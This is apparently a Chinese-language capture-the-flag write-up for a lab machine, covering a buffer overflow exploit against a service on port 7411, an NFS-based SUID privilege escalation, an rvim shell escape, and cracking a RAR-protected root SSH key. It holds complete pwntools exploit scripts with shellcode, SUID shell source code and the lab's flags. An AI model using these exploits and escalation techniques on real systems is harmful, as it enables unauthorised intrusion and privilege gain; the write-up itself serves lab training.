![image](https://hackmd.io/_uploads/SkFikGL7A.png)

在gdb 裡面執行他之後
讓他執行

![image](https://hackmd.io/_uploads/By6gxz8QC.png)

接著用nc去連接他

![image](https://hackmd.io/_uploads/HkmWgMLXA.png)

輸入admin 再用AAAAAAAA去塞他

![image](https://hackmd.io/_uploads/ByPzlMLXA.png)

可以看到我覆蓋到了 0x00414141
![image](https://hackmd.io/_uploads/SJCBbGIQ0.png)

先把nc 斷開
我們要先去找覆蓋到的位置

![image](https://hackmd.io/_uploads/ByEbzMIQC.png)

可以看到他在 0x413b4141 crack

![image](https://hackmd.io/_uploads/S1D5MNUmR.png)

用gdb 算 offset 是 28

![image](https://hackmd.io/_uploads/S1nUXVUXA.png)

我塞了28個A + 4個B

![image](https://hackmd.io/_uploads/Hk9JNVUmA.png)

他在0x42424242 (BBBB) crack

![image](https://hackmd.io/_uploads/S16WHVL70.png)

#### exploit part 1

```python=
#!/usr/bin/python3

from pwn import *

if args['REMOTE']:
        ip = '10.10.10.34'
else:
        ip = '127.0.0.1'


p = remote(ip,7411)
p.recvuntil(b"OK Ready. Send USER command.")
p.sendline(b"USER admin")
p.recvuntil(b"OK Send PASS command.")
p.sendline(b"DEBUG")
p.recvuntil(b"OK DEBUG mode on.")
p.sendline(b"PASS admin")
p.recvuntil(b"Debug: userpass buffer @ ")
userpass_addr = int(p.recvline(),16)
log.info(f"Got leak of userpass from server: 0x{userpass_addr:08x}")
p.close()

```

chatgpt解釋了08x是啥
![image](https://hackmd.io/_uploads/rkxHMHIQR.png)

右邊是開啟程序，左邊是可以抓到的addr 0xffffc840 (自己機器上的)
![image](https://hackmd.io/_uploads/rJgI3II7A.png)


#### exploit part 2 

現在抓到了offset 28
userpass -> (題目機器上的) 0xffffd610 & 0xffffc840 (自己機器上的)

```python=
#!/usr/bin/python3

from pwn import *

if args['REMOTE']:
        ip = '10.10.10.34'
else:
        ip = '127.0.0.1'

"""
p = remote(ip,7411)
p.recvuntil(b"OK Ready. Send USER command.")
p.sendline(b"USER admin")
p.recvuntil(b"OK Send PASS command.")
p.sendline(b"DEBUG")
p.recvuntil(b"OK DEBUG mode on.")
p.sendline(b"PASS admin")
p.recvuntil(b"Debug: userpass buffer @ ")
userpass_addr = int(p.recvline(),16)
log.info(f"Got leak of userpass from server: 0x{userpass_addr:08x}")
p.close()

"""

userpass_addr = 0xffffc840

payload = b"A" * 28
payload += p32(userpass_addr + 32)
payload += b"\xCC" * 16

p = remote(ip,7411)
p.recvuntil(b"OK Ready. Send USER command.")
p.sendline(b"USER admin")
p.recvuntil(b"OK Send PASS command.")
p.sendline(b"PASS "+payload)
```

可以看到eip 在0xffffc861
而\xCC 在他的前一個

![image](https://hackmd.io/_uploads/SJvzxDLQC.png)


#### exploit part 3

現在可以塞shellcode 進去
我花了點時間了解了shellcode
我發現他好像好像只是把reverse shell 換成組語
讓系統執行

我們可以用

-- > 這個需要自己算自己的ip 然後開nc
https://shell-storm.org/shellcode/files/shellcode-833.html

或是

這個執行上只要丟上去就好了
學術上會成功的原因
他好像是把 stdin stdout stderr 改成其他東西
然後執行 execve /bin/sh
https://blog.csdn.net/silent123go/article/details/71108501

https://www.exploit-db.com/exploits/34060

#### fin exploit

```python=
#!/usr/bin/python3

from pwn import *

if args['REMOTE']:
        ip = '10.10.10.34'
else:
        ip = '127.0.0.1'

"""
p = remote(ip,7411)
p.recvuntil(b"OK Ready. Send USER command.")
p.sendline(b"USER admin")
p.recvuntil(b"OK Send PASS command.")
p.sendline(b"DEBUG")
p.recvuntil(b"OK DEBUG mode on.")
p.sendline(b"PASS admin")
p.recvuntil(b"Debug: userpass buffer @ ")
userpass_addr = int(p.recvline(),16)
log.info(f"Got leak of userpass from server: 0x{userpass_addr:08x}")
p.close()

"""

userpass_addr = 0xffffd610

shellcode = b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
shellcode += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
shellcode += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
shellcode += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
shellcode += b"\x89\xe3\x31\xc9\xcd\x80";

payload = b"A" * 28
payload += p32(userpass_addr + 32)
payload += shellcode

p = remote(ip,7411)
p.recvuntil(b"OK Ready. Send USER command.")
p.sendline(b"USER admin")
p.recvuntil(b"OK Send PASS command.")
p.sendline(b"PASS "+payload)

p.interactive()
```

### nobody

![image](https://hackmd.io/_uploads/ryS1cPIQ0.png)

可以發現有一個frank 的身分組

![image](https://hackmd.io/_uploads/HJuGcDU7A.png)

可以用logreader.sh 來升級

![image](https://hackmd.io/_uploads/H1kB5v87C.png)

但我們不能對他做啥

![image](https://hackmd.io/_uploads/BJipqPUQC.png)

但其實我們在前面掛載資料夾的時候有看過他
或是說我們也可以在這裡找到
是說我們如果用root身分進來會變成nobody
如果不是的話就是 1000的身分組

![image](https://hackmd.io/_uploads/HJM8jwUQA.png)

由於我們前面有掛共享資料夾
所以我們可以直接寫程式碼
改他的suid

//0xdf

```c=
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setresuid(1000, 1000, 1000);
    system("/bin/bash");
    return 0;
}

```

掛載後touch一個file
-static 跟上題一樣可以解決版本問題
4777 給他權限

![image](https://hackmd.io/_uploads/BysdL_I7C.png)

直接執行他
![image](https://hackmd.io/_uploads/ByhpIOUQC.png)

frank
![image](https://hackmd.io/_uploads/S1IyPu87R.png)

### user.txt

75530c562f06d7ae4471922d84d80cbd
![image](https://hackmd.io/_uploads/S1nWPOU70.png)

### frank

sudo -l 可以看到可以升級成adm
![image](https://hackmd.io/_uploads/BJs7du8QR.png)

我試著用他升級，但跑出這樣
他應該是個vim
只是不知道為何長這樣

![image](https://hackmd.io/_uploads/HJRcd_UmR.png)

我知道vim是下 :![command]
來執行編輯的
所以我去查了一下有沒有可以用的shell
來幫助我升級
https://gtfobins.github.io/gtfobins/rvim/#shell

我想如果是在裡面，是A 情況的話應該可以試試看

![image](https://hackmd.io/_uploads/Skw4FdLQ0.png)

### adm

> :py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")

反正就enter就好不要裡他就會成功了
![image](https://hackmd.io/_uploads/BkKphd870.png)

adm

![image](https://hackmd.io/_uploads/rJ9wa_U7A.png)

### root

查看有adm 群組的檔案
後面那很方便是可以把proc的檔案濾掉
上面那些.s開頭的檔案應該都是我登入進去之後產生的

![image](https://hackmd.io/_uploads/Hy1bR_I7C.png)

adm的主目錄

![image](https://hackmd.io/_uploads/rJYkyYUQ0.png)

主目錄有三個檔案

![image](https://hackmd.io/_uploads/rJnY1F8mR.png)

他定義的鑰匙格式

![image](https://hackmd.io/_uploads/H1eCyYUX0.png)

rar裡面是root的ssh檔

![image](https://hackmd.io/_uploads/BkfQxK8QC.png)

他要密碼

![image](https://hackmd.io/_uploads/Bk7PlYIX0.png)

裡面是亂碼

![image](https://hackmd.io/_uploads/ry_teFL7A.png)

https://sites.google.com/site/cryptocrackprogram/user-guide/cipher-types/substitution/aristocratpatristocrat

https://rumkin.com/tools/cipher/atbash/
我發現了這個

解出來是這個
![image](https://hackmd.io/_uploads/SJAvMYImA.png)

逃離惡魔島
我記得的惡魔島除了霍金那個富人島以外(?
就是美國的一個監獄

所以我去查了 Alcatraz Escape
跑出一個 fbi的 history
如果這是密碼的線索
先說前提是 lastname + 4 digital + symbal


有三個人在不同年份跑出去了
下面是逃獄詳解

總之應該是 名字+年份+!(基本上都是驚嘆號)

Morris 1962 !
Anglin 1962 !
Anglin 1962 !

但我覺得應該是第一個Morris1962!

![image](https://hackmd.io/_uploads/rytJHF870.png)


### rar.key 的其他解法 番外文字版 (如果前面有用ssh就可以用這招但我懶惰沒有連)

先把key.rar 複製到 tmp
給他666
用scp 下載下來
用rar2john 轉成hash
再用hashcat 解開

### root still

好像還是要把他弄下來
我把他轉成 base64 

![image](https://hackmd.io/_uploads/BJpy5KIQC.png)

然後再把他轉回去

![image](https://hackmd.io/_uploads/Byqe9FLm0.png)

密碼輸入進去

![image](https://hackmd.io/_uploads/H1jLcFImA.png)

解出來的東西又是被加密過的
理論上如果是ssh的話
通常加密方式都是rsa

![image](https://hackmd.io/_uploads/Bk2FcKLXR.png)

所以這要用rsa去解
這邊有現成的工具
https://github.com/RsaCtfTool/RsaCtfTool.git
https://blog.csdn.net/qq_43390703/article/details/108500236

![image](https://hackmd.io/_uploads/SJmIAqD70.png)

![image](https://hackmd.io/_uploads/rJtjziDmC.png)

記得存起來之後要給他600
然後要讓ssh知道他的type是ssh

root
![image](https://hackmd.io/_uploads/Sk0I7oDQA.png)

root.txt
094cdf72e22fbef91610b927f6e1ecec
![image](https://hackmd.io/_uploads/B1Himjv7A.png)

The End (共11台)
---